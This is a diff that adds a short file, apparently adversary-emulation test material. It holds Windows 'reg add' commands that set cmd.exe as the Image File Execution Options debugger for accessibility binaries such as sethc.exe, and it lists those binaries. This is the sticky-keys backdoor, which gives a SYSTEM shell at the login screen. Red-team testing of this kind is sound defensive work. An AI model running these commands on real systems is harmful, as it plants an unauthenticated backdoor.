@@ -1,0 +1,17 @@
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\#{target_executable}" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
+
+sethc.exe
+utilman.exe
+osk.exe
+Magnify.exe
+Narrator.exe
+DisplaySwitch.exe
+AtBroker.exe
+
+On-Screen Keyboard: C:\Windows\System32\osk.exe
+Magnifier: C:\Windows\System32\Magnify.exe
+Narrator: C:\Windows\System32\Narrator.exe
+Display Switcher: C:\Windows\System32\DisplaySwitch.exe
+App Switcher: C:\Windows\System32\AtBroker.exe
+
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
